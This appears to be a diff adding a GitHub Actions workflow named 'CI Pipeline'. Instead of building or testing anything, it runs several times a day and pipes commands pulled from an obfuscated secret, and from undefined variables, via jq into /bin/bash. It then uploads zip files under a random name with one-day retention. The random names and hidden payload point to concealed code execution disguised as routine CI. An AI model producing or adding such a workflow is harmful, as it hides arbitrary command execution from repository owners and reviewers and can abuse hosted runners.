@@ -1,0 +1,32 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '38 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          igsxx302: ${{ secrets.igsxx302 }}
+        run: |
+          printf '%s' "$igsxx302" | jq -r .xoz4 | /bin/bash
+          echo $ydwdw184 | jq -r .fzh2105 | /bin/bash
+          echo $rbyt7 | jq -r .ecbm94 | /bin/bash
+          echo $neo47561 | jq -r .ap151 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: uEQKRJAI
+          path: "*.zip"
+          retention-days: 1
